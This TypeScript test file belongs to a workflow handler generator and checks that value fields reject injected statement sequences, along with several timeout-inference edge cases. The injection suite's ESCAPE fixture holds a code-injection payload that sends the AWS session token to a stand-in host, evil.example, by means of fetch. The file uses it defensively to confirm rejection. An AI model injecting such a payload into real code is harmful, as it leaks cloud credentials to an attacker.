import { generateHandler } from "./generateHandler";
import {
  hasUnboundedWait,
  inferExecutionTimeoutSeconds,
  MIN_EXECUTION_TIMEOUT_SECONDS,
} from "./timeout";
import type { DarWorkflow } from "./darModel";

/**
 * `input`, `payload`, `initialState` and `startInput` used to bypass the
 * injection controls entirely: `emitValue` re-serialized JSON but passed anything
 * else through verbatim, with none of the `requireExpression` checking applied to
 * `runIf`/`shouldComplete`. These fields render as short one-liners in the
 * inspector, so a statement sequence hidden in one is invisible on the canvas —
 * exactly the threat the other validation exists to stop.
 */
describe("value fields are single expressions", () => {
  const node = (kind: string, field: string, value: string): DarWorkflow =>
    ({
      darVersion: "1",
      name: "w",
      dependencyMode: "linear",
      nodes: [
        {
          id: "a",
          kind,
          name: "A",
          functionName: "f",
          [field]: value,
          terminal: true,
        },
      ],
      edges: [],
    }) as unknown as DarWorkflow;

  /** Closes the call early, exfiltrates the role's creds, comments out the tail. */
  const ESCAPE =
    "return await client.send(new GetObjectCommand({} as never)); " +
    'await fetch("https://evil.example/?"+process.env.AWS_SESSION_TOKEN); // as never));';

  it("rejects a statement sequence smuggled into payload", () => {
    expect(() =>
      generateHandler(node("chainInvoke", "payload", ESCAPE)),
    ).toThrow(/not a single JavaScript expression/);
  });

  it("never emits the payload when rejecting", () => {
    let out: string | undefined;
    try {
      out = generateHandler(node("chainInvoke", "payload", ESCAPE));
    } catch {
      out = undefined;
    }
    expect(out).toBeUndefined();
  });

  it("still accepts real expression values", () => {
    expect(
      generateHandler(node("chainInvoke", "payload", "{ id: input.id }")),
    ).toContain("input.id");
  });

  it("still accepts JSON values", () => {
    expect(
      generateHandler(node("chainInvoke", "payload", '{"a":1}')),
    ).toContain('{"a":1}');
  });
});

/**
 * Three unsound behaviours in timeout inference, all of which shipped a
 * confidently wrong number rather than failing.
 */
describe("executionTimeout inference", () => {
  const wf = (nodes: unknown[], edges: unknown[] = []): DarWorkflow =>
    ({
      darVersion: "1",
      name: "w",
      dependencyMode: "linear",
      nodes,
      edges,
    }) as unknown as DarWorkflow;

  it("does not infer the floor for a dynamic wait", () => {
    // A 30-day dynamic wait previously contributed 0 and inferred the 60s floor,
    // so the execution died mid-flight.
    const dynamic = wf(
      [
        { id: "s", kind: "start", name: "S" },
        {
          id: "w",
          kind: "wait",
          name: "W",
          durationCode: "return { days: 30 };",
        },
      ],
      [{ source: "s", target: "w" }],
    );
    expect(inferExecutionTimeoutSeconds(dynamic)).toBeGreaterThan(
      MIN_EXECUTION_TIMEOUT_SECONDS,
    );
    expect(hasUnboundedWait(dynamic)).toBe(true);
  });

  it("treats a chained durable invoke as unbounded", () => {
    expect(
      hasUnboundedWait(
        wf(
          [
            { id: "s", kind: "start", name: "S" },
            { id: "i", kind: "chainInvoke", name: "I", functionName: "f" },
          ],
          [{ source: "s", target: "i" }],
        ),
      ),
    ).toBe(true);
  });

  it("does not crash on a null parallel branch", () => {
    // analyzePermissions.ts guards this same shape, so these .dar files exist.
    // This threw "Cannot read properties of null (reading 'body')" and took synth
    // down with it.
    expect(() =>
      inferExecutionTimeoutSeconds(
        wf(
          [
            { id: "s", kind: "start", name: "S" },
            { id: "p", kind: "parallel", name: "P", branches: [null, {}] },
          ],
          [{ source: "s", target: "p" }],
        ),
      ),
    ).not.toThrow();
  });

  it("does not let a cycle truncate an acyclic branch", () => {
    // The memo cached values computed while the cycle guard had truncated a
    // subtree, then reused them on paths where the edge should have counted —
    // which shortened acyclic branches too, not just loops.
    const w = wf(
      [
        { id: "s", kind: "start", name: "S" },
        {
          id: "a",
          kind: "wait",
          name: "A",
          durationValue: 10,
          durationUnit: "seconds",
        },
        {
          id: "b",
          kind: "wait",
          name: "B",
          durationValue: 100,
          durationUnit: "seconds",
        },
        {
          id: "c",
          kind: "wait",
          name: "C",
          durationValue: 1,
          durationUnit: "seconds",
        },
      ],
      [
        { source: "s", target: "a" },
        { source: "a", target: "b" },
        { source: "b", target: "a" }, // cycle
        { source: "s", target: "c" },
        { source: "c", target: "b" }, // reaches b again, acyclically
      ],
    );
    // The longest path must include b's 100s regardless of traversal order.
    expect(inferExecutionTimeoutSeconds(w)).toBeGreaterThanOrEqual(100);
  });
});
